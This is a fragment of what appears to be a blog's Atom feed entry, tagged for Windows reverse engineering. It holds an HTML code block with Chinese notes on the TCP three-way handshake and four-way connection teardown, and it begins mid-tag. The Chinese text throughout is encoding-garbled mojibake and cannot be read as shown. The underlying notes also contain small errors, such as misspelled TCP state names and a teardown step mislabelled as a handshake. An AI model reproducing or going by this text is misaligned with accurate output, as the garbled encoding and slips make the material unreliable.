class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ä¸‰æ¬¡æ¡æ‰‹ï¼š</span><br><span class="line">åˆšå¼€å§‹å®¢æˆ·ç«¯å¤„äº closed çš„çŠ¶æ€ï¼ŒæœåŠ¡ç«¯å¤„äº listen çŠ¶æ€ã€‚ç„¶å</span><br><span class="line">1ã€ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯ç»™æœåŠ¡ç«¯å‘ä¸€ä¸ª SYN æŠ¥æ–‡ï¼Œå¹¶æŒ‡æ˜å®¢æˆ·ç«¯çš„åˆå§‹åŒ–åºåˆ—å· ISNï¼ˆcï¼‰ã€‚æ­¤æ—¶å®¢æˆ·ç«¯å¤„äº SYN_Send çŠ¶æ€ã€‚</span><br><span class="line"></span><br><span class="line">2ã€ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„ SYN æŠ¥æ–‡ä¹‹åï¼Œä¼šä»¥è‡ªå·±çš„ SYN æŠ¥æ–‡ä½œä¸ºåº”ç­”ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯æŒ‡å®šäº†è‡ªå·±çš„åˆå§‹åŒ–åºåˆ—å· ISN(s)ï¼ŒåŒæ—¶ä¼šæŠŠå®¢æˆ·ç«¯çš„ ISN + 1 ä½œä¸º ACK çš„å€¼ï¼Œè¡¨ç¤ºè‡ªå·±å·²ç»æ”¶åˆ°äº†å®¢æˆ·ç«¯çš„ SYNï¼Œæ­¤æ—¶æœåŠ¡å™¨å¤„äº SYN_REVD çš„çŠ¶æ€ã€‚</span><br><span class="line"></span><br><span class="line">3ã€ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ° SYN æŠ¥æ–‡ä¹‹åï¼Œä¼šå‘é€ä¸€ä¸ª ACK æŠ¥æ–‡ï¼Œå½“ç„¶ï¼Œä¹Ÿæ˜¯ä¸€æ ·æŠŠæœåŠ¡å™¨çš„ ISN + 1 ä½œä¸º ACK çš„å€¼ï¼Œè¡¨ç¤ºå·²ç»æ”¶åˆ°äº†æœåŠ¡ç«¯çš„ SYN æŠ¥æ–‡ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å¤„äº establised çŠ¶æ€ã€‚</span><br><span class="line"></span><br><span class="line">4ã€æœåŠ¡å™¨æ”¶åˆ° ACK æŠ¥æ–‡ä¹‹åï¼Œä¹Ÿå¤„äº establised çŠ¶æ€ï¼Œæ­¤æ—¶ï¼ŒåŒæ–¹ä»¥å»ºç«‹èµ·äº†é“¾æ¥ã€‚</span><br><span class="line"></span><br><span class="line">å››æ¬¡æŒ¥æ‰‹ï¼š</span><br><span class="line">1ã€ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€ä¸€ä¸ª FIN æŠ¥æ–‡ï¼ŒæŠ¥æ–‡ä¸­ä¼šæŒ‡å®šä¸€ä¸ªåºåˆ—å·ã€‚æ­¤æ—¶å®¢æˆ·ç«¯å¤„äºFIN_WAIT1çŠ¶æ€ã€‚</span><br><span class="line"></span><br><span class="line">2ã€ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡ç«¯æ”¶åˆ° FIN ä¹‹åï¼Œä¼šå‘é€ ACK æŠ¥æ–‡ï¼Œä¸”æŠŠå®¢æˆ·ç«¯çš„åºåˆ—å·å€¼ + 1 ä½œä¸º ACK æŠ¥æ–‡çš„åºåˆ—å·å€¼ï¼Œè¡¨æ˜å·²ç»æ”¶åˆ°å®¢æˆ·ç«¯çš„æŠ¥æ–‡äº†ï¼Œæ­¤æ—¶æœåŠ¡ç«¯å¤„äº CLOSE_WAITçŠ¶æ€ã€‚</span><br><span class="line"></span><br><span class="line">3ã€ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹ï¼šå¦‚æœæœåŠ¡ç«¯ä¹Ÿæƒ³æ–­å¼€è¿æ¥äº†ï¼Œå’Œå®¢æˆ·ç«¯çš„ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ä¸€æ ·ï¼Œå‘ç»™ FIN æŠ¥æ–‡ï¼Œä¸”æŒ‡å®šä¸€ä¸ªåºåˆ—å·ã€‚æ­¤æ—¶æœåŠ¡ç«¯å¤„äº LAST_ACK çš„çŠ¶æ€ã€‚</span><br><span class="line"></span><br><span class="line">4ã€ç¬¬å››æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ° FIN ä¹‹åï¼Œä¸€æ ·å‘é€ä¸€ä¸ª ACK æŠ¥æ–‡ä½œä¸ºåº”ç­”ï¼Œä¸”æŠŠæœåŠ¡ç«¯çš„åºåˆ—å·å€¼ + 1 ä½œä¸ºè‡ªå·± ACK æŠ¥æ–‡çš„åºåˆ—å·å€¼ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å¤„äº TIME_WAIT çŠ¶æ€ã€‚éœ€è¦è¿‡ä¸€é˜µå­ä»¥ç¡®ä¿æœåŠ¡ç«¯æ”¶åˆ°è‡ªå·±çš„ ACK æŠ¥æ–‡ä¹‹åæ‰ä¼šè¿›å…¥ CLOSED çŠ¶æ€</span><br><span class="line"></span><br><span class="line">5ã€æœåŠ¡ç«¯æ”¶åˆ° ACK æŠ¥æ–‡ä¹‹åï¼Œå°±å¤„äºå…³é—­è¿æ¥äº†ï¼Œå¤„äº CLOSED çŠ¶æ€ã€‚</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    <category term="windowsé€†å‘" scheme="http://example.com/categories/windows%E9%80%86%E5%90%91/"/>
    
    <category term="ç¼–ç¨‹" scheme="http://example.com/categories/windows%E9%80%86%E5%90%91/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="äºŒè¿›åˆ¶" scheme="http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    <category term="windows" scheme="http://example.com/tags/windows/"/>
    
    <category term="windowsç¼–ç¨‹" scheme="http://example.com/tags/windows%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
</feed>
